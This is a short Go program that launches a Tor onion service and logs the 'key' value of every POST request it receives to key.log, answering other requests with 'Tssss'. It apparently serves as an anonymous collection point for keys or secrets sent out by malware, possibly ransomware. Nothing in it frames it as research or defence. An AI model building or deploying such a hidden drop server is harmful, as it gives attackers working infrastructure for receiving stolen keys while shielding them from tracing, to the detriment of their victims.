package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/cretz/bine/tor"
)

func main() {
	if err := run(); err != nil {
		log.Fatal(err)
	}
}

func run() error {
	// Start TOR
	fmt.Println("Starting and registering onion service...")
	t, err := tor.Start(context.TODO(), nil)
	if err != nil {
		log.Panicf("Unable to start Tor: %v", err)
	}
	defer t.Close()

	// Wait to publish Service
	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer listenCancel()

	// Listen
	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
	if err != nil {
		log.Panicf("Unable to create onion service: %v", err)
	}
	defer onion.Close()

	fmt.Printf("Listening for POST request on http://%v.onion\n", onion.ID)

	// Serve the current folder from HTTP
	errCh := make(chan error, 1)
	http.HandleFunc("/", listener)
	errCh <- http.Serve(onion, nil)
	// End when enter is pressed

	if err = <-errCh; err != nil {
		log.Panicf("Failed serving: %v", err)
	}

	return err
}

func listener(w http.ResponseWriter, r *http.Request) {

	switch r.Method {
	case "POST":
		if err := r.ParseForm(); err != nil {
			fmt.Fprintf(w, "ParseForm() err: %v", err)
			return
		}

		key := r.PostFormValue("key")
		fmt.Println(key)
		f, err := os.OpenFile("key.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
		}
		if _, err := f.WriteString(key + "\n"); err != nil {
			log.Println(err)
		}
		defer f.Close()

	default:
		fmt.Fprintf(w, "Tssss")
	}
}
